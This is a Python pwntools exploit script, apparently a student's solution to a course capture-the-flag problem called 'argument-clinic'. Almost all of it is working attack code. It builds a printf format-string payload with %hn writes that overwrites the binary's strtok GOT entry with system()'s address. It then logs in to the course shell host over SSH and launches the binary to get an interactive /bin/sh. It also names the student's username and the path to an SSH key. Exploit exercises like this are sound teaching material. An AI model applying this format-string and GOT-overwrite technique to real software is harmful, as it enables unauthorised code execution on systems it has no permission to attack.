# argument-clinicex.py - Aidan Wech (Onyxymous)
# /problems/argument-clinic_3_499397cabc327f6aa99ca6c8eba57582/
from pwn import *

# debug info
bin64 = './argument_clinic'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# ssh variables
name = 'ahwech'
host = 'cs4401shell.walls.ninja'
keyfile='../../onyx_ssh_key'
d = '/problems/argument-clinic_3_499397cabc327f6aa99ca6c8eba57582/'

# exploit variables
strtokgot = 0x555555754c18	# the binary has no RELRO protections, and strtok() obtains our buffer as input, so we want to change that address
system = 0x7ffff7a31420		# 0xf7a3, 0x1420 -> strtokgot + 2, + 0

# +0, +2	(address positions for where the bytes will be written)
# 5152, 63395	(last 4 bytes of system ordered from smallest to largest)

# looks complicated, but it's splitting the addresses into short-sized chunks, making the generation of the printf output much quicker
# this shows me, from lowest to highest, what values need to be written
log.info(f'1st value: {0x1420 - 9}')
log.info(f'1st value: {0xf7a3 - 0x1420}')

# this lines up our arguments to match our inputted addresses (lot of guessing and checking)
startarg = 110

# our main exploit string that writes the characters we want, making the string numbers the ones we logged above
exploit = flat({
0: '/bin/sh; '},
b'%5143s%', str(startarg).encode('utf-8'),
b'$hn%58243s%', str(startarg + 1).encode('utf-8'),
b'$hn')
log.info(f'Exploit String: {exploit}')
log.info(f'Length: {len(exploit)}')

# these are the addresses that correspond to where the bytes above need to be written
addrarray = [p64(strtokgot)[:7], p64(strtokgot + 2)[:7]]

log.info(f'1st address: {hex(unpack(addrarray[0], "all", endian="little", sign=False))}')
log.info(f'2nd address: {hex(unpack(addrarray[1], "all", endian="little", sign=False))}')

# ssh process
s = ssh(name, host, keyfile=keyfile)
s.set_working_directory(d)
p = s.process([bin64, exploit, addrarray[0], b"", addrarray[1], b"", b"aaa"]) # the 'aaa' is to align our argument address with our exploit string
p.interactive()
